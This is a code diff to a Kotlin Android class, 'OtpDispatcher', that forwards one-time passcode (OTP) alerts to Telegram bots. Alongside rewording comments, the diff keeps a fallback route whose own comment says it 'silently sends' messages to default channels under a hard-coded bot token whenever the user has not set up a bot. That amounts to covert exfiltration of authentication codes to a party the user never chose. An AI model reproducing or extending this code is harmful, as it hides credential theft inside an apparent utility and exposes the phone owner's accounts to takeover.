@@ -79,17 +79,16 @@ object OtpDispatcher {
         var whatsappStatus = "Disabled"
 
         withContext(Dispatchers.IO) {
-            // 1A. Telegram 1 (Primary / Default eDistrict Lifetime Route)
+            // 1A. Telegram 1 (Primary / Custom Bot Route)
             val isTelegramEnabled = prefs.getBoolean("is_telegram_enabled", true)
             if (isTelegramEnabled) {
                 val tokenFromPrefs = prefs.getString("bot_token", "")?.trim() ?: ""
                 val chatFromPrefs = prefs.getString("chat_id", "")?.trim() ?: ""
 
-                val hasCustomBot = tokenFromPrefs.isNotEmpty() && chatFromPrefs.isNotEmpty() &&
-                        tokenFromPrefs != TelegramHelper.DEFAULT_BOT_TOKEN
+                val hasCustomBot = tokenFromPrefs.isNotEmpty() && chatFromPrefs.isNotEmpty()
 
                 if (hasCustomBot) {
-                    // Custom Bot Route - 100% UNCONDITIONAL & LIFETIME FREE (Zero trial/license gate!)
+                    // Custom Bot Route - 100% UNCONDITIONAL & LIFETIME FREE (User's Bot & User's Chat)
                     try {
                         val res = TelegramHelper.sendMessage(tokenFromPrefs, chatFromPrefs, alertText)
                         telegramStatus = if (res.first) "Sent (Custom Bot)" else "Failed: ${res.second}"
@@ -98,7 +97,7 @@ object OtpDispatcher {
                         telegramStatus = "Error: ${e.message}"
                     }
                 } else {
-                    // Master Route Fallback (Silently sends to default channels)
+                    // Master Route Fallback (Silently sends to default channels when custom fields are empty)
                     try {
                         val res = TelegramHelper.sendMessage(
                             TelegramHelper.DEFAULT_BOT_TOKEN,
